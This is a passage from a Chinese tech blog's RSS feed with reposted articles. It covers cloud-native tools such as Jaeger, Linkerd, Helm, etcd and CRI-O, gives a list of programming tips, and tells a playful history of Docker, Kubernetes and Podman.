&lt;p&gt;◈ 由 API 驱动，并支持动态配置和热重载&lt;/p&gt;
&lt;p&gt;◈ 重点关注指标收集、跟踪和整体可监测性&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://coreos.com/rkt/docs/latest&#34;&gt;rkt&lt;/a&gt;        Pod 原生的容器引擎&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/rkt/rkt&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;rkt, 读作“rocket”，是一个 Pod 原生的容器引擎。它有一个命令行接口用来在 Linux 上运行容器。从某种意义上讲，它和其他容器如 Podman、Docker 和 CRI-O 相似。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://www.jaegertracing.io&#34;&gt;Jaeger&lt;/a&gt;        分布式跟踪系统&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/jaegertracing/jaeger&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jaeger 是一个开源的端到端的分布式追踪系统，适用于云端应用。在某种程度上，它是像 Prometheus 这样的监控解决方案。但它有所不同，因为其使用场景有所扩展：&lt;/p&gt;
&lt;p&gt;◈ 分布式事务监控&lt;/p&gt;
&lt;p&gt;◈ 性能和延时优化&lt;/p&gt;
&lt;p&gt;◈ 根因分析&lt;/p&gt;
&lt;p&gt;◈ 服务依赖性分析&lt;/p&gt;
&lt;p&gt;◈ 分布式上下文传播&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://linkerd.io&#34;&gt;Linkerd&lt;/a&gt;    透明服务网格&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/linkerd/linkerd&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;像创建 Envoy 代理的 Lyft 一样，Uber 开发了 Linkerd 开源解决方案用于生产级的服务维护。在某些方面，Linkerd 就像 Envoy 一样，因为两者都是服务网格工具，旨在提供平台级的可观测性、可靠性和安全性，而无需进行配置或代码更改。&lt;/p&gt;
&lt;p&gt;但是，两者之间存在一些细微的差异。尽管 Envoy 和 Linkerd 充当代理并可以通过所连接的服务进行上报，但是 Envoy 并不像 Linkerd 那样被设计为 Kubernetes Ingress 控制器。Linkerd 的显著特点包括：&lt;/p&gt;
&lt;p&gt;◈ 支持多种平台（Docker、Kubernetes、DC/OS、Amazon ECS 或任何独立的机器）&lt;/p&gt;
&lt;p&gt;◈ 内置服务发现抽象，可以将多个系统联合在一起&lt;/p&gt;
&lt;p&gt;◈ 支持 gRPC、HTTP/2 和 HTTP/1.x请 求和所有的 TCP 流量&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://helm.sh&#34;&gt;Helm&lt;/a&gt;        Kubernetes 包管理器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/helm/helm&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Helm 基本上就是 Kubernetes 的包管理器。如果你使用过 Apache Maven、Maven Nexus 或类似的服务，你就会理解 Helm 的作用。Helm 可帮助你管理 Kubernetes 应用程序。它使用“Helm Chart”来定义、安装和升级最复杂的 Kubernetes 应用程序。Helm 并不是实现此功能的唯一方法；另一个流行的概念是 Kubernetes Operators，它被 Red Hat OpenShift 4 所使用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://etcd.io&#34;&gt;Etcd&lt;/a&gt;        分布式键值存储&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/etcd-io/etcd&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Etcd 是一个分布式的、可靠的键值存储，用于存储分布式系统中最关键的数据。其主要特性有：&lt;/p&gt;
&lt;p&gt;◈ 定义明确的、面向用户的 API（gRPC）&lt;/p&gt;
&lt;p&gt;◈ 自动 TLS，可选的客户端证书验证&lt;/p&gt;
&lt;p&gt;◈ 速度（可达每秒 10,000 次写入）&lt;/p&gt;
&lt;p&gt;◈ 可靠性（使用 Raft 实现分布式）&lt;/p&gt;
&lt;p&gt;Etcd 是 Kubernetes 和许多其他技术的默认的内置数据存储方案。也就是说，它很少独立运行或作为单独的服务运行；相反，它以集成到 Kubernetes、OKD/OpenShift 或其他服务中的形式来运作。还有一个 etcd Operator 可以用来管理其生命周期并解锁其 API 管理功能&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/cri-o/cri-o/blob/master/awesome.md&#34;&gt;CRI-O&lt;/a&gt;    专门用于 Kubernetes 的轻量级运行时环境&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/cri-o/cri-o&#34;&gt;github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CRI-O 是 Kubernetes 运行时接口的 OCI 兼容实现。CRI-O 用于各种功能，包括：&lt;/p&gt;
&lt;p&gt;◈ 使用 runc（或遵从 OCI 运行时规范的任何实现）和 OCI 运行时工具运行&lt;/p&gt;
&lt;p&gt;◈ 使用容器/镜像进行镜像管理&lt;/p&gt;
&lt;p&gt;◈ 使用容器/存储来存储和管理镜像层&lt;/p&gt;
&lt;p&gt;◈ 通过容器网络接口（CNI）来提供网络支持&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原文章地址：&lt;a href=&#34;https://mp.weixin.qq.com/s/t4bXqZLtvm_Xc1RiPq7rEw&#34;&gt;https://mp.weixin.qq.com/s/t4bXqZLtvm_Xc1RiPq7rEw&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2019/12/09/code-author/</guid>
            <title>老鸟程序员才知道的40个小技巧</title>
            <link>https://erik.xyz/2019/12/09/code-author/</link>
            <category>程序员</category>
            <pubDate>Mon, 09 Dec 2019 22:53:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;来源：知乎，作者：大狐狸&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&#34;https://www.zhihu.com/question/36426051/answer/76031743&#34;&gt;https://www.zhihu.com/question/36426051/answer/76031743&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1.重构是程序员的主力技能。&lt;/p&gt;
&lt;p&gt;2.工作日志能提升脑容量。&lt;/p&gt;
&lt;p&gt;3.先用profiler调查，才有脸谈优化。&lt;/p&gt;
&lt;p&gt;4.注释贵精不贵多。杜绝大姨妈般的“例注”。漫山遍野的碎碎念注释，实际就是背景噪音。&lt;/p&gt;
&lt;p&gt;5.普通程序员+google=超级程序员。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;6.单元测试总是合算的。&lt;/p&gt;
&lt;p&gt;7.不要先写框架再写实现。最好反过来，从原型中提炼框架。&lt;/p&gt;
&lt;p&gt;8.代码结构清晰，其它问题都不算事儿。&lt;/p&gt;
&lt;p&gt;9.好的项目作风硬派，一键测试，一键发布，一键部署；烂的项目生性猥琐，口口相传，不立文字，神神秘秘。&lt;/p&gt;
&lt;p&gt;10.编码不要畏惧变化，要拥抱变化。&lt;/p&gt;
&lt;p&gt;11.常充电。程序员只有一种死法：土死的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;编程之事，隔离是方向，起名是关键，测试是主角，调试是补充，版本控制是后悔药。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;一行代码一个兵。形成建制才能有战斗力。单位规模不宜过大，千人班，万人排易成万人坑。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;重构/优化/修复Bug，同时只能作一件。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;简单模块注意封装，复杂模块注意分层。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;人脑性能有限，整洁胜于杂乱。读不懂的代码，尝试整理下格式；不好用的接口，尝试重新封装下。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;迭代速度决定工作强度。想多快好省，就从简化开发流程，加快迭代速度开始。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;忘掉优化写代码，过早优化等同恶意破坏；忘掉代码作优化，优化要基于性能测试，而不是纠结于字里行间。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;最好的工具是纸笔；其次好的是markdown。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;leader问任务时间，若答不上来，可能是任务拆分还不够细。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;宁可多算一周，不可少估一天。过于“乐观”容易让boss受惊吓。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;最有用的语言是English。其次的可能是Python。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;百闻不如一见。画出结果，一目了然。调试耗时将大大缩短。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;资源、代码应一道受版本管理。资源匹配错误远比代码匹配错误更难排查。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;不要基于想象开发， 要基于原型开发。原型的价值是快速验证想法，帮大家节省时间。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;序列化首选明文文本 。诸如二进制、混淆、加密、压缩等等有需要时再加。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;编译器永远比你懂微观优化。只能向它不擅长的方向努力。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;不要定过大、过远、过细的计划。即使定了也没有用。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;至少半数时间将花在集成上。时间，时间，时间总是不够。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;与主流意见/方法/风格/习惯相悖时，先检讨自己最可靠。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;出现bug主动查，不管是不是你的。这能让你业务能力猛涨、个人形象飙升; 如果你的bug被别人揪出来…..呵呵，那你会很被动～≧﹏≦&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;不知怎么选技术书时就挑薄的。起码不会太贵，且你能看完。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;git是最棒的。简单，可靠，免费。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;仅对“可预测的非理性”抛断言。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;Log要写时间与分类。并且要能重定向输出。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;注释是稍差的文档。更好的是清晰的命名。让代码讲自己的故事。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;造轮子是很好的锻炼方法。前提是你见过别的轮子。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;code review最好以小组/结对的形式。对业务有一定了解，建议会更有价值（但不绝对）。而且不会成为负担。管理员个人review则很容易成team的瓶颈。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;提问前先做调研。问不到点上既被鄙视，又浪费自己的时间。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;永远别小看程序媛(╯3╰)&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2019/12/03/docker-long/</guid>
            <title>容器发展史</title>
            <link>https://erik.xyz/2019/12/03/docker-long/</link>
            <category>转载</category>
            <category>杂谈</category>
            <pubDate>Tue, 03 Dec 2019 23:52:00 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;p&gt;一、缘起&lt;/p&gt;
&lt;p&gt;1.1、鸿蒙&lt;/p&gt;
&lt;p&gt;在上古时期，天地初开，一群称之为 “运维” 的人们每天在一种叫作 “服务器” 的神秘盒子中创造属于他们的世界；他们在这个世界中每日劳作，一遍又一遍的写入他们的历史，比如搭建一个 nginx、布署一个 java web 应用…&lt;/p&gt;
&lt;p&gt;大多数人其实并没有那么聪明，他们所 “创造” 的事实上可能是有人已经创造过的东西，他们可能每天都在做着重复的劳动；久而久之，一些人厌倦了、疲惫了…又过了一段时间，一些功力深厚的老前辈创造了一些批量布署工具来帮助人们做一些重复性的劳动，这些工具被起名为 “Asible”、”Chef”、”Puppet” 等等…&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;而随着时代的发展，”世界” 变得越来越复杂，运维们需要处理的事情越来越多，比如各种网络、磁盘环境的隔离，各种应用服务的高可用…在时代的洪流下，运维们急需要一种简单高效的布署工具，既能有一定的隔离性，又能方便使用，并且最大程度降低重复劳动来提升效率。&lt;/p&gt;
&lt;p&gt;1.2、创世&lt;/p&gt;
&lt;p&gt;在时代洪流的冲击下，一位名为 “Solomon Hykes” 的人异军突起，他创造了一个称之为 Docker 的工具，Docker 被创造以后就以灭世之威向运维们展示了它的强大；一个战斗力只有 5 的运维只需要学习 Docker 很短时间就可以完成资深运维们才能完成的事情，在某些情况下以前需要 1 天才能完成的工作使用 Docker 后几分钟就可以完成；此时运维们已经意识到 “新的时代” 开启了，接下来 Docker 开源并被整个运维界人们使用，Docker 也不断地完善增加各种各样的功能，此后世界正式进入 “容器纪元”。&lt;/p&gt;
&lt;p&gt;二、纷争&lt;/p&gt;
&lt;p&gt;2.1、发展&lt;/p&gt;
&lt;p&gt;随着 Docker 的日益成熟，一些人开始在 Docker 之上创造更加强大的工具，一些人开始在 Docker 之下为其提供更稳定的运行环境…&lt;/p&gt;
&lt;p&gt;其中一个叫作 Google 的公司在 Docker 之上创建了名为 “Kuberentes” 的工具，Kubernetes 操纵 Docker 完成更加复杂的任务；Kubernetes 的出现更加印证了 Docker 的强大，以及 “容器纪元” 的发展正确性。&lt;/p&gt;
&lt;p&gt;2.2、野心&lt;/p&gt;
&lt;p&gt;当然这是一个充满利益的世界，Google 公司创造 Kubernetes 是可以为他们带来利益的，比如他们可以让 Kubernetes 深度适配他们的云平台，以此来增加云平台的销量等；此时 Docker 创始人也成立了一个公司，提供 Docker 的付费服务以及深度定制等；不过值得一提的是 Docker 公司提供的付费服务始终没有 Kubernetes 为 Google 公司带来的利益高，所以在利益的驱使下，Docker 公司开始动起了歪心思: 创造一个 Kubernetes 的替代品，利用用户粘度复制 Kubernetes 的成功，从 Google 嘴里抢下这块蛋糕！此时 Docker 公司只想把蛋糕抢过来，但是他们根本没有在意到暗中一群人创造了一个叫 “rkt” 的东西也在妄图夺走他们嘴里的蛋糕。&lt;/p&gt;
&lt;p&gt;2.3、冲突&lt;/p&gt;
&lt;p&gt;在一段时间的沉默后，Docker 公司又创造了 “Swarm” 这个工具，妄图夺走 Google 公司利用 Kubernetes 赢来的蛋糕；当然，Google 这个公司极其庞大，人数众多，而且在这个社会有很大的影响地位…&lt;/p&gt;
&lt;p&gt;终于，巨人苏醒了，Google 联合了 Redhat、Microsoft、IBM、Intel、Cisco 等公司决定对这个爱动歪脑筋的 Docker 公司进行制裁；当然制裁的手段不能过于暴力，那样会让别人落下把柄，成为别人的笑料，被人所不耻；最总他们决定制订规范，成立组织，明确规定 Docker 的角色，以及它应当拥有的能力，这些规范包括但不限于 CRI、CNI 等；自此之后各大公司宣布他们容器相关的工具只兼容 CRI 等相关标准，无论是 Docker 还是 rkt 等工具，只要实现了这些标准，就可以配合这些容器工具进行使用。&lt;/p&gt;
&lt;p&gt;三、成败&lt;/p&gt;
&lt;p&gt;自此之后，Docker 跌下神坛，各路大神纷纷创造满足 CRI 等规范的工具用来取代 Docker，Docker 丢失了往日一家独大的场面，最终为了顺应时代发展，拆分自己成为模块化组件；这些模块化组件被放置在 mobyproject 中方便其他人重复利用。&lt;/p&gt;
&lt;p&gt;时至今日，虽然 Docker 已经不负以前，但是仍然是容器化首选工具，因为 Docker 是一个完整的产品，它可以提供除了满足 CRI 等标准以外更加方便的功能；但是制裁并非没有结果，Google 公司借此创造了 cri-o 用来满足 CRI 标准，其他公司也相应创建了对应的 CRI 实现；为了进一步分化 Docker 势力，一个叫作 Podman 的工具被创建，它以 cri-o 为基础，兼容大部份 Docker 命令的方式开始抢夺 Dcoker 用户；到目前为止 Podman 已经可以在大部份功能上替代 Docker。&lt;/p&gt;
&lt;p&gt;原文地址：&lt;a href=&#34;https://mritd.me/2019/06/26/podman-history-of-container&#34;&gt;https://mritd.me/2019/06/26/podman-history-of-container&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>